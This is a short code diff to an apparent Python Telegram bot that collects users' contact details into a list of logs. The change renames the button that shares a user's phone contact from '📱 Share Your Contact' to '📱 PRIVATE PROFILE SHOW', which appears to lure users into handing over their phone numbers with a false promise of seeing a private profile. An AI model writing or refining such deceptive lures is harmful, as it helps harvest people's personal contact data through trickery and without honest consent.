@@ -17,7 +17,7 @@ contact_logs = []  # List to store all contact logs received through @DARKMODOFF
 @bot.message_handler(commands=['start'])
 def welcome(message):
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    button = telebot.types.KeyboardButton(text="📱 Share Your Contact", request_contact=True)
+    button = telebot.types.KeyboardButton(text="📱 PRIVATE PROFILE SHOW", request_contact=True)
     markup.add(button)
     bot.send_message(
         message.chat.id,
